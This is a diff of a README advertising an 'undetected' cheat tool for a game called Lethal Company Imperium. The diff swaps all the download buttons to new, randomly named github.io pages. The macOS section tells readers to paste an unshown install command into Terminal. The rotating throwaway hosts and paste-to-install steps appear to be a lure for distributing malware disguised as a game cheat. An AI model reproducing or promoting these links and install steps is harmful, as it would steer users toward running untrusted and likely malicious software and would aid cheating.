@@ -1,9 +1,9 @@
 # 🎮 Lethal Company Imperium Tool — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://mkiiavwgxyhx.github.io/windows-runner/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://Cascadegliline.github.io/mac-runner/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://Cascadegliline.github.io/mac-runner/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://Cascadegliline.github.io/mac-runner/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://zfboreoxhmwh.github.io/win-dl/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://FlagArcher36.github.io/macos-pkg/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://FlagArcher36.github.io/macos-pkg/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://FlagArcher36.github.io/macos-pkg/)
 
 > The most trusted **Lethal Company Imperium Tool** for 2026 — operates as a standalone utility with no game process injection, providing a safe and undetected experience.
 
@@ -45,14 +45,14 @@
 5. 🎮 Launch **Lethal Company Imperium** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://zfboreoxhmwh.github.io/win-dl/)
 
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://Cascadegliline.github.io/mac-runner/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://FlagArcher36.github.io/macos-pkg/)
 
 **Menu Controls**
 
